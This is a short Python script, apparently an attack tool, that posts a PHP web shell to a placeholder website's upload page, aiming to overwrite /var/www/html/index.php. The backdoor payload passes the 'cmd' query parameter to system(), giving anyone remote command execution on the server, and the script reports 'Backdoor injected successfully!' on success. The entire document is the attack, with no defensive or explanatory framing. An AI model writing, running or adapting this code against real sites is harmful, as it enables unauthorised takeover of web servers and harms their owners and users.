import requests

def inject_backdoor(file_path, backdoor_code):
    url = "http://target-website.com/your-vulnerable-page.php"
    
    payload = "<?php " + backdoor_code + " ?>"
    
    files = {'file': (file_path, payload, 'text/php')}
    
    response = requests.post(url, files=files)
    
    if response.status_code == 200:
        print("Backdoor injected successfully!")
    else:
        print("Injection failed.")

file_path = "/var/www/html/index.php"
backdoor_code = "system($_GET['cmd']);"

inject_backdoor(file_path, backdoor_code)